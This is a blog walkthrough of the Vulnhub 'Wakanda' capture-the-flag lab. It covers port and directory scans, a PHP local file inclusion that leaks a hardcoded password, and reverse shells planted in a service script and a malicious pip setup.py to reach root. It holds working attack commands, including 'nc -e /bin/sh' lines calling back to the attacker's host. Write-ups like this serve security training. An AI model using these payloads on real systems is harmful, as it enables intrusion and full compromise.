---
layout:     post
title:      "Vulnhub.com - Wakanda"
date:       2018-08-09 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

In this post we're going to walk through an amazing box from Vulnhub called **Wakanda**. 

{% highlight text %}
A new Vibranium market will soon be online in the dark net. Your goal, get your hands on the root file containing the exact location of the mine.

Intermediate level

Flags: There are three flags (flag1.txt, flag2.txt, root.txt)

    DHCP: Enabled
    IP Address: Automatically assigned

Hint: Follow your intuitions ... and enumerate!

For any questions, feel free to contact me on Twitter: xMagass

Happy Hacking!
{% endhighlight %}

* Author: [xMagass](https://twitter.com/@xMagass)
* Download: [https://www.vulnhub.com/entry/wakanda-1,251/](https://www.vulnhub.com/entry/wakanda-1,251/)

### Solution

From start we're going to do an `nmap` scan. 

{% highlight text %}
root@kali:~# nmap -v -sS -sV -sC -A -T4 -p- 10.0.0.13
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-08 05:22 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 05:22
Completed NSE at 05:22, 0.00s elapsed
Initiating NSE at 05:22
Completed NSE at 05:22, 0.00s elapsed
Initiating ARP Ping Scan at 05:22
Scanning 10.0.0.13 [1 port]
Completed ARP Ping Scan at 05:22, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:22
Completed Parallel DNS resolution of 1 host. at 05:22, 0.00s elapsed
Initiating SYN Stealth Scan at 05:22
Scanning 10.0.0.13 [65535 ports]
Discovered open port 111/tcp on 10.0.0.13
Discovered open port 80/tcp on 10.0.0.13
Discovered open port 3333/tcp on 10.0.0.13
Discovered open port 38284/tcp on 10.0.0.13
Completed SYN Stealth Scan at 05:23, 5.33s elapsed (65535 total ports)
Initiating Service scan at 05:23
Scanning 4 services on 10.0.0.13
Completed Service scan at 05:23, 11.02s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.13
NSE: Script scanning 10.0.0.13.
Initiating NSE at 05:23
Completed NSE at 05:23, 0.33s elapsed
Initiating NSE at 05:23
Completed NSE at 05:23, 0.01s elapsed
Nmap scan report for 10.0.0.13
Host is up (0.00073s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Vibranium Market
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          38284/tcp  status
|_  100024  1          44089/udp  status
3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
38284/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 198.048 days (since Mon Jan 22 03:14:46 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.73 ms 10.0.0.13

NSE: Script Post-scanning.
Initiating NSE at 05:23
Completed NSE at 05:23, 0.00s elapsed
Initiating NSE at 05:23
Completed NSE at 05:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.42 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
{% endhighlight %}

We can already see 2 interesting services - `ssh` on port 3333 and `http` on port 80. In the meantime I decide to run a `gobuster` scan against the web page as I couldn't find anything useful on my own. 

{% highlight text %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.0.13 -x .php,.txt

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.0.0.13/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 307,200,204,301,302
[+] Extensions   : .php,.txt
=====================================================
/index.php (Status: 200)
/fr.php (Status: 200)
/admin (Status: 200)
/shell (Status: 200)
/backup (Status: 200)
/secret (Status: 200)
/secret.txt (Status: 200)
/troll (Status: 200)
/hahaha (Status: 200)
/hohoho (Status: 200)
=====================================================
{% endhighlight %}

We can see a whole number of websites, but actually looking at them with `curl` shows that most of them are just empty files. 

{% highlight text %}
root@kali:~# curl 10.0.0.13/fr.php
root@kali:~# curl 10.0.0.13/admin
root@kali:~# curl 10.0.0.13/shell
root@kali:~# curl 10.0.0.13/backup
root@kali:~# curl 10.0.0.13/secret
root@kali:~# curl 10.0.0.13/troll
root@kali:~# curl 10.0.0.13/hahaha
root@kali:~# curl 10.0.0.13/hohoho

root@kali:~# curl http://10.0.0.13/secret.txt
Congratulations! 

Nope!I am joking....
{% endhighlight %}

Coming back to the main page, we have a commented out link that will change the language of the content.

{% highlight text %}
http://10.0.0.13/?lang=fr
{% endhighlight %}

As we know that there is a file called `fr.php` we can suspect that the script running behind this page will append `.php` extension to anything we pass with parameter. 

I decided to look for some vulnerabilities for this type of situation and came up with [this paper](https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf). With this, we can leak the source code of the pages. 

{% highlight text %}
root@kali:~# curl http://10.0.0.13/?lang=php://filter/convert.base64-encode/resource=fr 
PD9waHAKCiRtZXNzYWdlPSJQcm9jaGFpbmUgb3V2ZXJ0dXJlIGR1IHBsdXMgZ3JhbmQgbWFyY2jDqSBkdSB2aWJyYW5pdW0uIExlcyBwcm9kdWl0cyB2aWVubmVudCBkaXJlY3RlbWVudCBkdSB3YWthbmRhLiBSZXN0ZXogw6AgbCfDqWNvdXRlISI7


<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Vibranium market">
    <meta name="author" content="mamadou">

    <title>Vibranium Market</title>


    <link href="bootstrap.css" rel="stylesheet">

    
    <link href="cover.css" rel="stylesheet">
  </head>

  <body class="text-center">

    <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
      <header class="masthead mb-auto">
        <div class="inner">
          <h3 class="masthead-brand">Vibranium Market</h3>
          <nav class="nav nav-masthead justify-content-center">
            <a class="nav-link active" href="#">Home</a>
            <!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
          </nav>
        </div>
      </header>

      <main role="main" class="inner cover">
        <h1 class="cover-heading">Coming soon</h1>
        <p class="lead">
                  </p>
        <p class="lead">
          <a href="#" class="btn btn-lg btn-secondary">Learn more</a>
        </p>
      </main>

      <footer class="mastfoot mt-auto">
        <div class="inner">
          <p>Made by<a href="#">@mamadou</a></p>
        </div>
      </footer>
    </div>
{% endhighlight %}

Now we can decode the source.

{% highlight text %}
root@kali:~# echo "PD9waHAKCiRtZXNzYWdlPSJQcm9jaGFpbmUgb3V2ZXJ0dXJ3JhbmQgbWFyY2jDqSBkdSB2aWJyYW5pdW0uIExlcyBwcm9kdWl0cyB2aWVubmVudCBkaXJlY3RlbWVudCBkdSB3YWthbmRhLiBSZXN0ZXogw6AgbCfDqWNvdXRlISI7" | base64 -d
<?php

$message="Prochaine ouverture du plus grand marché du vibranium. Les produits viennent directement du wakanda. Restez à l'écoute!";
{% endhighlight %}

Hey, that's the message showing up when we change the language! We can do the same with `index.php` file. 

{% highlight text %}
root@kali:~# curl http://10.0.0.13/?lang=php://filter/convert.base64-encode/resource=index
PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=


<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Vibranium market">
    <meta name="author" content="mamadou">

    <title>Vibranium Market</title>


    <link href="bootstrap.css" rel="stylesheet">

    
    <link href="cover.css" rel="stylesheet">
  </head>

  <body class="text-center">

    <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
      <header class="masthead mb-auto">
        <div class="inner">
          <h3 class="masthead-brand">Vibranium Market</h3>
          <nav class="nav nav-masthead justify-content-center">
            <a class="nav-link active" href="#">Home</a>
            <!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
          </nav>
        </div>
      </header>

      <main role="main" class="inner cover">
        <h1 class="cover-heading">Coming soon</h1>
        <p class="lead">
                  </p>
        <p class="lead">
          <a href="#" class="btn btn-lg btn-secondary">Learn more</a>
        </p>
      </main>

      <footer class="mastfoot mt-auto">
        <div class="inner">
          <p>Made by<a href="#">@mamadou</a></p>
        </div>
      </footer>
    </div>

{% endhighlight %}

And decode the source. 

{% highlight text %}
root@kali:~# echo "PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISESB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=
> " | base64 -d

<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}

?>



<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Vibranium market">
    <meta name="author" content="mamadou">

    <title>Vibranium Market</title>


    <link href="bootstrap.css" rel="stylesheet">

    
    <link href="cover.css" rel="stylesheet">
  </head>

  <body class="text-center">

    <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
      <header class="masthead mb-auto">
        <div class="inner">
          <h3 class="masthead-brand">Vibranium Market</h3>
          <nav class="nav nav-masthead justify-content-center">
            <a class="nav-link active" href="#">Home</a>
            <!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
          </nav>
        </div>
      </header>

      <main role="main" class="inner cover">
        <h1 class="cover-heading">Coming soon</h1>
        <p class="lead">
          <?php
            if (isset($_GET['lang']))
          {
          echo $message;
          }
          else
          {
            ?>

            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!
            <?php
          }
?>
        </p>
        <p class="lead">
          <a href="#" class="btn btn-lg btn-secondary">Learn more</a>
        </p>
      </main>

      <footer class="mastfoot mt-auto">
        <div class="inner">
          <p>Made by<a href="#">@mamadou</a></p>
        </div>
      </footer>
    </div>
</body></html>
{% endhighlight %}

We have the password! 

{% highlight text %}
$password ="Niamey4Ever227!!!" ;//I have to remember it
{% endhighlight %}

As I suspect it's for `ssh`, we now have to get the username. My first guess wass `niamey`. 

{% highlight text %}
root@kali:~# ssh niamey@10.0.0.13 -p 3333
niamey@10.0.0.13's password: 
Permission denied, please try again.
niamey@10.0.0.13's password: 
Permission denied, please try again.
niamey@10.0.0.13's password: 
niamey@10.0.0.13: Permission denied (publickey,password).
{% endhighlight %}

But it did not work out, so I decided to check `mamadou` as it's the possible creator.

{% highlight text %}
root@kali:~# ssh mamadou@10.0.0.13 -p 3333
mamadou@10.0.0.13's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug  3 15:53:29 2018 from 192.168.56.1
Python 2.7.9 (default, Jun 29 2016, 13:08:31) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.


>>> import pty
>>> pty.spawn("/bin/bash")
mamadou@Wakanda1:~$ whoami
mamadou
mamadou@Wakanda1:~$ id
uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)
{% endhighlight %}

At the login we are greeted with the python interpreter, but we can easily spawn the `bash` shell with `pty`. Now it's time for more enumeration. 

{% highlight text %}
mamadou@Wakanda1:~$ ls -la
total 24
drwxr-xr-x 2 mamadou mamadou 4096 Aug  5 02:24 .
drwxr-xr-x 4 root    root    4096 Aug  1 15:23 ..
lrwxrwxrwx 1 root    root       9 Aug  5 02:24 .bash_history -> /dev/null
-rw-r--r-- 1 mamadou mamadou  220 Aug  1 13:15 .bash_logout
-rw-r--r-- 1 mamadou mamadou 3515 Aug  1 13:15 .bashrc
-rw-r--r-- 1 mamadou mamadou   41 Aug  1 15:52 flag1.txt
-rw-r--r-- 1 mamadou mamadou  675 Aug  1 13:15 .profile
mamadou@Wakanda1:~$ cat flag1.txt 

Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
{% endhighlight %}

And the first flag! Two more to go. 

{% highlight text %}
mamadou@Wakanda1:~$ ls -la /home
total 16
drwxr-xr-x  4 root    root      4096 Aug  1 15:23 .
drwxr-xr-x 22 root    root      4096 Aug  1 13:05 ..
drwxr-xr-x  2 devops  developer 4096 Aug  5 02:25 devops
drwxr-xr-x  2 mamadou mamadou   4096 Aug  5 02:24 mamadou
{% endhighlight %}

In `/home` directory we can see another user `devops`, with a second flag inside his directory. While looking for some more clues, I found `test` file in `/tmp`. 

{% highlight text %}
mamadou@Wakanda1:/$ cd tmp
mamadou@Wakanda1:/tmp$ ls -la
total 32
drwxrwxrwt  7 root   root      4096 Aug  8 10:00 .
drwxr-xr-x 22 root   root      4096 Aug  1 13:05 ..
drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .font-unix
drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .ICE-unix
-rw-r--r--  1 devops developer    4 Aug  8 09:59 test
drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .Test-unix
drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .X11-unix
drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .XIM-unix
mamadou@Wakanda1:/tmp$ cat test
test
{% endhighlight %}

It's owner is `devops`, so I decided to find more files that he's an owner of. 

{% highlight text %}
mamadou@Wakanda1:/tmp$ find / -user devops 2>/dev/null
/srv/.antivirus.py
/tmp/test
/home/devops
/home/devops/.bashrc
/home/devops/.profile
/home/devops/.bash_logout
/home/devops/flag2.txt

mamadou@Wakanda1:/tmp$ cat /srv/.antivirus.py 
open('/tmp/test','w').write('test')
{% endhighlight %}

Hey, it's a python script in `/srv/` directory. I decided to change it with `os.system('nc -e /bin/sh 10.0.0.4 1337')` that will spawn a reverse shell whenever the script is executed, but I could not find any cronjobs that could execute it. To my amusement, after coming back after a small break, I've noticed a shell in my listener. 

{% highlight text %}
root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
10.0.0.13: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.13] 36433
whoami
devops
python -c 'import pty;pty.spawn("/bin/bash");'
devops@Wakanda1:/$ 


devops@Wakanda1:/$ cd home/devops
cd home/devops
devops@Wakanda1:~$ ls -la
ls -la
total 24
drwxr-xr-x 2 devops developer 4096 Aug  5 02:25 .
drwxr-xr-x 4 root   root      4096 Aug  1 15:23 ..
lrwxrwxrwx 1 root   root         9 Aug  5 02:25 .bash_history -> /dev/null
-rw-r--r-- 1 devops developer  220 Aug  1 15:23 .bash_logout
-rw-r--r-- 1 devops developer 3515 Aug  1 15:23 .bashrc
-rw-r----- 1 devops developer   42 Aug  1 15:57 flag2.txt
-rw-r--r-- 1 devops developer  675 Aug  1 15:23 .profile
devops@Wakanda1:~$ cat flag2.txt
cat flag2.txt
Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098
{% endhighlight %}

Now we have a second flag, but what executed this file? I decided to look for the files containing `antivirus.py` in it. 

{% highlight text %}
mamadou@Wakanda1:/etc$ grep -Ril .antivirus.py / 2>/dev/null
/lib/systemd/system/antivirus.service
^C
mamadou@Wakanda1:/etc$ cat /lib/systemd/system/antivirus.service 
[Unit]
Description=Antivirus
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=300 
User=devops
ExecStart=/usr/bin/env python /srv/.antivirus.py

[Install]
WantedBy=multi-user.target
{% endhighlight %}

Oh, so there it is! Restarted every 300 seconds, a service that will run the antivirus. As this is completed, let's move to escalation to root. 

{% highlight text %}
devops@Wakanda1:~$ sudo -l
sudo -l
Matching Defaults entries for devops on Wakanda1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip
{% endhighlight %}

We can run as `pip` as root, which makes our search much easier. While googling, I've found [this technique](https://github.com/0x00-0x00/FakePip) to execute command with pip.

Let's download `setup.py` as instructed and change the base64 encoded string into simple `os.system('nc -e /bin/sh 10.0.0.4 443')`. Here is our modified script in `fakepip` directory. 

{% highlight text %}
devops@Wakanda1:~/fakepip$ wget 10.0.0.4:8080/setup.py
wget 10.0.0.4:8080/setup.py
--2018-08-08 13:54:39--  http://10.0.0.4:8080/setup.py
Connecting to 10.0.0.4:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 545 [text/plain]
Saving to: ‘setup.py’

setup.py            100%[=====================>]     545  --.-KB/s   in 0s     

2018-08-08 13:54:39 (4.85 MB/s) - ‘setup.py’ saved [545/545]

devops@Wakanda1:~/fakepip$ cat setup.py
cat setup.py
from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        os.system('nc -e /bin/sh 10.0.0.4 443')

setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
      cmdclass={'install':CustomInstall})
{% endhighlight %}

Now we're ready to install the package. 

{% highlight text %}
devops@Wakanda1:~/fakepip$ sudo /usr/bin/pip install . --upgrade --force-reinstall
<sudo /usr/bin/pip install . --upgrade --force-reinstall                     
Unpacking /home/devops/fakepip
  Running setup.py (path:/tmp/pip-4FK12P-build/setup.py) egg_info for package from file:///home/devops/fakepip
    
Installing collected packages: FakePip
  Found existing installation: FakePip 0.0.1
    Uninstalling FakePip:
      Successfully uninstalled FakePip
  Running setup.py install for FakePip
{% endhighlight %}

And what's in our listener?

{% highlight text %}
root@kali:~# nc -lvp 443
listening on [any] 443 ...
10.0.0.13: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.13] 51199
whoami
root
python -c 'import pty;pty.spawn("/bin/bash");'
root@Wakanda1:/tmp/pip-4FK12P-build# cd /root
cd /root
root@Wakanda1:~# ls -la
ls -la
total 20
drwx------  2 root root 4096 Aug  5 02:26 .
drwxr-xr-x 22 root root 4096 Aug  1 13:05 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r-----  1 root root  429 Aug  1 15:16 root.txt
root@Wakanda1:~# cat root.txt
cat root.txt
 _    _.--.____.--._
( )=.-":;:;:;;':;:;:;"-._
 \\\:;:;:;:;:;;:;::;:;:;:\
  \\\:;:;:;:;:;;:;:;:;:;:;\
   \\\:;::;:;:;:;:;::;:;:;:\
    \\\:;:;:;:;:;;:;::;:;:;:\
     \\\:;::;:;:;:;:;::;:;:;:\
      \\\;;:;:_:--:_:_:--:_;:;\
       \\\_.-"             "-._\
        \\
         \\
          \\
           \\ Wakanda 1 - by @xMagass
            \\
             \\


Congratulations You are Root!

821ae63dbe0c573eff8b69d451fb21bc
{% endhighlight %}

And we have a flag!